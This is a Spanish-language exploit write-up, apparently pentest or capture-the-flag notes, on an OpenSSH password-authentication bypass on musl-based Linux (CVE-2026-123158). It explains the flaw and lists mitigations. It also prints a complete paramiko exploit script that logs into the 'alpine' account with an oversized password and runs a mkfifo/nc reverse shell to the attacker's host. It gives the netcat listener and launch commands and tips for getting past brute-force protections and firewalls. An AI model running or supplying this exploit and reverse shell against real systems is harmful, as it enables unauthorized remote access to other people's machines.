# Bypass de Autenticación SSH en musl — CVE-2026-123158 (*sshole*)

## Descripción

Bypass de autenticación por contraseña en OpenSSH, publicado en noviembre de 2026, que afecta a sistemas Linux que usan **musl libc** (Alpine, OpenWrt, Buildroot, Yocto...) en vez de la `glibc` habitual de Ubuntu/Debian. Permite iniciar sesión en cuentas que tienen la contraseña **deshabilitada**, enviando una contraseña sobredimensionada.

**Afectados:** OpenSSH 7.3p1 a 10.6p1 (`< 10.6p2`), sobre musl, con `UsePAM no` y `PasswordAuthentication yes`.

---
## Condiciones necesarias (las cinco a la vez)

1. OpenSSH `< 10.6p2`
2. Sistema basado en **musl**, no glibc
3. `UsePAM no` en `sshd_config`
4. `PasswordAuthentication yes`
5. La cuenta objetivo tiene el campo de `/etc/shadow` exactamente igual a `*` (no `!`, `!!`, `*LK*` ni un hash bloqueado tipo `!$y$...` — esos no cuentan)

---
## Mecanismo interno

Cuatro comportamientos independientes se combinan:

1. **Convención BSD:** las cuentas que no deben autenticar por contraseña guardan `*` en el shadow.
2. **musl's `crypt()` devuelve `"*"` al fallar**, en vez de `NULL` (que es lo que dicta POSIX, y lo que hace `glibc` — por eso Ubuntu/Debian no son vulnerables aunque corran la misma versión de OpenSSH).
3. La implementación SHA-256/512 de musl **rechaza contraseñas de más de 256 bytes**. Una contraseña de 257+ bytes dispara el fallo → devuelve `"*"`.
4. El parche de OpenSSH para CVE-2016-6210 (canal lateral de timing) hace que, cuando el campo del shadow no empieza por `$` (como `*`), `pick_salt()` **tome prestada** la sal `$5$`/`$6$` de otra cuenta local, para que el tiempo de cálculo sea indistinguible de una cuenta con contraseña real.

La comparación final la hace `sys_auth_passwd()` con un simple `strcmp()` entre el resultado de `crypt()` y el campo guardado. Si ambos son `"*"`, coincide → acceso concedido.

**root por defecto también tiene `*`**, pero requiere además `PermitRootLogin yes`. En Alpine, la cuenta de sistema **`alpine`** también lleva `*` y no tiene esa restricción — es el objetivo natural.

### Por qué hacen falta dos intentos en la misma conexión

`pick_salt()` escanea las cuentas con `getpwent()` y cachea la primera sal `$...$` que encuentra en un buffer estático. `shadow_pw()` (antes de la 10.6p2) apuntaba al buffer estático de `getspnam()`, que ese mismo escaneo sobrescribe. Resultado: en el **primer** intento el campo ya no lee `*` (falla), pero en el **segundo**, `shadow_pw()` recarga `*` con una llamada fresca a `getspnam()` mientras `pick_salt()` devuelve su sal cacheada sin tocar el buffer de nuevo — ahí es cuando la comparación cuadra.

---
## Identificación

```bash
nmap -p22 -sV TARGET_IP
# OpenSSH 10.6 (o inferior a 10.6p2) → candidato
# confirmar que el sistema detrás es musl (Alpine, OpenWrt...) por otras vías (banners, apps, contenedores)
```

---
## Explotación

```bash
sudo pacman -S python-paramiko      # o: pip install paramiko --break-system-packages
```

```python
#!/usr/bin/env python3
import paramiko, sys, time

host, lhost = sys.argv[1], sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001
pw = "A" * 300   # > 256 bytes, dispara el fallo de musl

t = paramiko.Transport((host, 22))
t.start_client(timeout=10)

for i in range(1, 7):
    try:
        t.auth_password("alpine", pw)   # cambiar por el usuario objetivo
        print(f"[+] intento {i}: autenticado")
        break
    except paramiko.AuthenticationException:
        print(f"[-] intento {i}: denegado")

if not t.is_authenticated():
    print("[-] fallo"); sys.exit(1)

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command(rev)
time.sleep(5)
t.close()
print("[+] enviado")
```

```bash
nc -lvnp 9001
python3 sshole.py TARGET_IP TU_IP 9001
```

> El cliente `ssh` normal (con `sshpass`) **no sirve bien** para esto: no da control fino sobre los dos intentos exactos en la misma conexión TCP. Usar una librería (paramiko) que controle el `Transport` directamente.

---
## Troubleshooting

- Muchos intentos fallidos seguidos contra el mismo host activan protecciones anti-fuerza-bruta: la respuesta pasa de `Permission denied, please try again.` a `Connection reset by ... port 22`. No insistir — hay que tener el usuario correcto antes de lanzar el exploit repetidamente.
- Si la reverse shell no llega aunque el script diga `[+] enviado`, comprobar el firewall local (`sudo ufw status`, `sudo nft list ruleset`) antes de sospechar del exploit — un `tcpdump -i tun0 port PUERTO` con solo SYN repetidos (sin SYN-ACK) confirma que el bloqueo es local.

---
## Mitigación

- Actualizar a OpenSSH 10.6p2 o posterior.
- Actualizar musl a una versión que arregle `crypt()`.
- Desactivar `PasswordAuthentication` (usar solo claves).
- `PermitRootLogin prohibit-password` (mitiga solo para `root`, no para otras cuentas `*` como `alpine`).
